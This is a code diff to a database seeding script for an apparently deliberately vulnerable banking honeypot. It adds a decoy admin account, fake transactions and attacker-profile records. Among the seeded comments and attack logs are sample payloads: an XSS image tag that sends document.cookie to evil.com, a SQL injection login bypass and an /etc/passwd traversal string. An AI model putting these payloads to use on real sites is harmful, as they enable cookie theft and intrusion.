@@ -13,6 +13,7 @@ const initializeDatabase = async () => {
       DROP TABLE IF EXISTS loans CASCADE;
       DROP TABLE IF EXISTS transactions CASCADE;
       DROP TABLE IF EXISTS ioc_records CASCADE;
+      DROP TABLE IF EXISTS session_replays CASCADE;
       DROP TABLE IF EXISTS attack_logs CASCADE;
       DROP TABLE IF EXISTS attacker_profiles CASCADE;
       DROP TABLE IF EXISTS users CASCADE;
@@ -102,59 +103,57 @@ const initializeDatabase = async () => {
       )
     `);
 
-    // Create attack_logs table
+    // Create attack_logs table according to request schema
     console.log('🚨 Creating attack_logs table...');
     await pool.query(`
       CREATE TABLE attack_logs (
           id SERIAL PRIMARY KEY,
-          timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+          timestamp TIMESTAMPTZ DEFAULT NOW(),
           source_ip VARCHAR(45),
           source_port INTEGER,
           method VARCHAR(10),
           path TEXT,
           payload TEXT,
           attack_type VARCHAR(50),
-          sub_attack_type VARCHAR(100),
-          severity INTEGER CHECK (severity BETWEEN 1 AND 10),
+          severity VARCHAR(20),
           user_agent TEXT,
           tool_detected VARCHAR(100),
           os_fingerprint VARCHAR(100),
-          session_id VARCHAR(255),
-          targeted_endpoint VARCHAR(200),
-          attempted_username VARCHAR(100),
-          attempted_account VARCHAR(20),
-          response_code INTEGER,
-          is_blocked BOOLEAN DEFAULT FALSE
+          session_id VARCHAR(100),
+          response_code INTEGER
       )
     `);
 
-    // Create attacker_profiles table
+    // Create attacker_profiles table according to request schema
     console.log('👹 Creating attacker_profiles table...');
     await pool.query(`
       CREATE TABLE attacker_profiles (
-          ip VARCHAR(45) PRIMARY KEY,
-          first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-          last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-          total_requests INTEGER DEFAULT 0,
-          threat_score INTEGER DEFAULT 0 CHECK (threat_score BETWEEN 0 AND 100),
-          country VARCHAR(100),
-          city VARCHAR(100),
-          isp VARCHAR(200),
-          os VARCHAR(100),
-          tool VARCHAR(100),
+          ip                VARCHAR(45) PRIMARY KEY,
+          first_seen        TIMESTAMPTZ,
+          last_seen         TIMESTAMPTZ,
+          total_requests    INTEGER DEFAULT 0,
+          threat_score      INTEGER DEFAULT 0,
+          country           VARCHAR(100),
+          city              VARCHAR(100),
+          isp               VARCHAR(200),
+          os                VARCHAR(100),
+          tool              VARCHAR(100),
           is_known_malicious BOOLEAN DEFAULT FALSE,
-          sqli_count INTEGER DEFAULT 0,
-          xss_count INTEGER DEFAULT 0,
-          bruteforce_count INTEGER DEFAULT 0,
-          traversal_count INTEGER DEFAULT 0,
-          csrf_count INTEGER DEFAULT 0,
-          idor_count INTEGER DEFAULT 0,
-          attempted_account_takeover BOOLEAN DEFAULT FALSE,
-          attempted_funds_transfer BOOLEAN DEFAULT FALSE,
-          attempted_privilege_escalation BOOLEAN DEFAULT FALSE,
-          latitude DECIMAL(10, 8),
-          longitude DECIMAL(11, 8),
-          last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+          sqli_count        INTEGER DEFAULT 0,
+          xss_count         INTEGER DEFAULT 0,
+          bruteforce_count  INTEGER DEFAULT 0,
+          traversal_count   INTEGER DEFAULT 0
+      )
+    `);
+
+    // Create session_replays table
+    console.log('📼 Creating session_replays table...');
+    await pool.query(`
+      CREATE TABLE session_replays (
+          session_id      VARCHAR(100) PRIMARY KEY,
+          ip              VARCHAR(45),
+          created_at      TIMESTAMPTZ DEFAULT NOW(),
+          actions         TEXT
       )
     `);
 
@@ -318,12 +317,27 @@ const initializeDatabase = async () => {
 
     // Insert test users
     await pool.query(`
-      INSERT INTO users (username, password, email, phone, full_name, date_of_birth, ssn, address, branch_id, account_number, account_balance, credit_score) VALUES
-      ('john_doe', 'password123', 'john.doe@email.com', '+1-212-555-1001', 'John Doe', '1985-03-15', '123-45-6789', '123 Home Street, NY', 1, 'ACC10001', 15420.50, 720),
-      ('jane_smith', 'qwerty456', 'jane.smith@email.com', '+1-310-555-1002', 'Jane Smith', '1990-07-22', '987-65-4321', '456 Oak Avenue, CA', 2, 'ACC10002', 89300.75, 785),
-      ('robert_brown', 'brown2024', 'robert.brown@email.com', '+1-312-555-1003', 'Robert Brown', '1978-11-30', '555-12-3456', '789 Pine Road, IL', 3, 'ACC10003', 12500.00, 650),
-      ('admin', 'admin', 'admin@securebank.com', '+1-212-555-1005', 'Admin User', '1980-01-01', '111-22-3333', '999 Admin Lane, NY', 1, 'ACC10999', 999999.99, 850),
-      ('testuser', 'testpass', 'test@email.com', '+1-212-555-1006', 'Test User', '1995-12-25', '999-88-7777', '123 Test Street, NY', 1, 'ACC10005', 2500.00, 600)
+      INSERT INTO users (user_id, username, password, email, phone, full_name, date_of_birth, ssn, address, branch_id, account_number, account_balance, credit_score) VALUES
+      (9999, 'decoy_sec_admin', 'decoy123', 'sec-admin@securebank-decoy.com', '+1-000-555-9999', 'Decoy Secret Administrator', '1980-01-01', '999-99-9999', '999 Decoy Lane, NY', 1, 'ACC99999', 5543209.50, 850),
+      (1, 'john_doe', 'password123', 'john.doe@email.com', '+1-212-555-1001', 'John Doe', '1985-03-15', '123-45-6789', '123 Home Street, NY', 1, 'ACC10001', 15420.50, 720),
+      (2, 'jane_smith', 'qwerty456', 'jane.smith@email.com', '+1-310-555-1002', 'Jane Smith', '1990-07-22', '987-65-4321', '456 Oak Avenue, CA', 2, 'ACC10002', 89300.75, 785),
+      (3, 'robert_brown', 'brown2024', 'robert.brown@email.com', '+1-312-555-1003', 'Robert Brown', '1978-11-30', '555-12-3456', '789 Pine Road, IL', 3, 'ACC10003', 12500.00, 650),
+      (4, 'admin', 'admin', 'admin@securebank.com', '+1-212-555-1005', 'Admin User', '1980-01-01', '111-22-3333', '999 Admin Lane, NY', 1, 'ACC10999', 999999.99, 850),
+      (5, 'testuser', 'testpass', 'test@email.com', '+1-212-555-1006', 'Test User', '1995-12-25', '999-88-7777', '123 Test Street, NY', 1, 'ACC10005', 2500.00, 600)
+    `);
+
+    // Insert transactions
+    await pool.query(`
+      INSERT INTO transactions (transaction_ref, from_user_id, to_user_id, from_account, to_account, amount, transaction_type, status, remarks, completed_at) VALUES
+      ('TXN99001', NULL, 9999, 'FEDERAL_RESERVE', 'ACC99999', 5000000.00, 'Income', 'Completed', 'Initial Treasury Allocation', NOW()),
+      ('TXN99002', NULL, 9999, 'CHASE_SETTLEMENT', 'ACC99999', 1000000.00, 'Income', 'Completed', 'Interbank Liquidity Settlement', NOW()),
+      ('TXN99003', 9999, NULL, 'ACC99999', 'CORP_FIREEYE_INC', 250000.00, 'Wire', 'Completed', 'Bulk Security Infrastructure Invoice', NOW()),
+      ('TXN99004', 9999, NULL, 'ACC99999', 'CORP_DELL_SEC', 206790.50, 'Wire', 'Completed', 'Encrypted Hardware Server Procurement', NOW()),
+      ('TXN10001', NULL, 1, 'PAYROLL_ACME_CORP', 'ACC10001', 18000.00, 'Income', 'Completed', 'Payroll Credit - Acme Corp', NOW()),
+      ('TXN10002', 1, NULL, 'ACC10001', 'APARTMENT_RENTAL', 1200.00, 'Expense', 'Completed', 'Monthly Rental Payment', NOW()),
+      ('TXN10003', 1, NULL, 'ACC10001', 'AUTO_FINANCE_EMI', 1379.50, 'Expense', 'Completed', 'Auto Loan EMI Payment', NOW()),
+      ('TXN20001', NULL, 2, 'PAYROLL_TECH_CORP', 'ACC10002', 95000.00, 'Income', 'Completed', 'Payroll Credit - Tech Corp', NOW()),
+      ('TXN20002', 2, NULL, 'ACC10002', 'CORP_INVESTMENT', 5699.25, 'Expense', 'Completed', 'Mutual Fund Investment Portfolio', NOW())
     `);
 
     // Insert comments
@@ -332,15 +346,23 @@ const initializeDatabase = async () => {
       ('John Doe', 'customer', 'Great banking platform! Very secure.', 'feedback', '192.168.1.100'),
       ('Jane Smith', 'customer', 'Love the new mobile app features.', 'feedback', '192.168.1.101'),
       ('hacker', 'guest', '<script>alert("XSS Attack!")</script>', 'support_ticket', '10.0.0.50'),
-      ('attacker', 'guest', '<img src="invalid" onerror="fetch(\'http://evil.com/steal?cookie=\'+document.cookie)">', 'feedback', '10.0.0.60')
+      ('attacker', 'guest', '<img src="invalid" onerror="fetch(''http://evil.com/steal?cookie=''+document.cookie)">', 'feedback', '10.0.0.60')
     `);
 
     // Insert attack logs
     await pool.query(`
-      INSERT INTO attack_logs (source_ip, method, path, payload, attack_type, severity, tool_detected, targeted_endpoint, attempted_username) VALUES
-      ('192.168.1.200', 'POST', '/api/login', 'username=admin%27+OR+%271%27%3D%271&password=anything', 'SQL_INJECTION', 8, 'SQLMap', '/api/login', 'admin'),
-      ('10.0.0.55', 'GET', '/api/search', 'q=<script>alert(document.cookie)</script>', 'REFLECTED_XSS', 7, 'Manual', '/api/search', NULL),
-      ('192.168.1.201', 'GET', '/api/download', 'file=../../../etc/passwd', 'DIRECTORY_TRAVERSAL', 6, 'DirBuster', '/api/download', NULL)
+      INSERT INTO attack_logs (source_ip, method, path, payload, attack_type, severity, tool_detected, response_code) VALUES
+      ('192.168.1.200', 'POST', '/api/login', 'username=admin%27+OR+%271%27%3D%271&password=anything', 'sqli', 'HIGH', 'SQLMap', 200),
+      ('10.0.0.55', 'GET', '/api/search', 'q=<script>alert(document.cookie)</script>', 'xss', 'HIGH', 'Manual', 200),
+      ('192.168.1.201', 'GET', '/api/download', 'file=../../../etc/passwd', 'traversal', 'HIGH', 'DirBuster', 200)
+    `);
+
+    // Insert seeded attacker profiles
+    await pool.query(`
+      INSERT INTO attacker_profiles (ip, country, city, isp, os, tool, threat_score, sqli_count, xss_count, traversal_count, first_seen, last_seen) VALUES
+      ('192.168.1.200', 'United States', 'Washington', 'Comcast', 'Linux', 'SQLMap', 85, 1, 0, 0, NOW(), NOW()),
+      ('10.0.0.55', 'Germany', 'Berlin', 'Deutsche Telekom', 'Windows', 'Manual', 70, 0, 1, 0, NOW(), NOW()),
+      ('192.168.1.201', 'Pakistan', 'Lahore', 'PTCL', 'Linux', 'DirBuster', 65, 0, 0, 1, NOW(), NOW())
     `);
 
     console.log('\n✅ Database initialized successfully!');
